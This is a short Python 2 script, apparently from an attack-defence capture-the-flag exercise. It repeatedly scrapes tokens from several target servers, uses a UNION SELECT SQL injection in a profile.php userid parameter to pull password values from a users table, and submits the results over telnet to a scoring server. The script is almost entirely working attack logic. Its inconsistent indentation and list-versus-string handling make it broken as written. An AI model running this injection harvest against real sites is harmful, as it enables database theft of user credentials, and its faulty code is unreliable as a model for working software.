#!/usr/bin/python
import paramiko
import re
import telnetlib
import time
import urllib2
import urllib
serv_list=(2,3,4,5,6,7)
def submit(flags):
  #print flags
	t=telnetlib.Telnet("10.1.100.1",31337)
        t.get_socket().recv(1024)
        t.write("2\n")
        t.get_socket().recv(1024)
        for flag in flags:
		        t.write(flag+"\n")
		        print flag
            print t.get_socket().recv(1024).strip()
        t.close()
        time.sleep(5)

while True:
	flags=[]
	for no in serv_list:
		try:
			serv_addr='http://10.1.10%s.1'%no
			rawdat=urllib2.urlopen(serv_addr).read()
			flag=re.findall("\w{16}",rawdat)
			for fl in flag:
				serv_addr2='http://10.1.10'+str(no)+'.1/?p=profile.php&userid=-1%20union%20all%20select%20password,1%20from%20users%20where%20username=%27'+fl+'%27#'
				rawd=urllib2.urlopen(serv_addr2).read()
				foo=re.findall("\w{32}",rawd)
				flags.append(foo)
			
		except:
			print "Exception. ",no
			pass
	if len(flags)==0:
		print "Flag list emply."
	else:
		print flags
		submit(flags)		
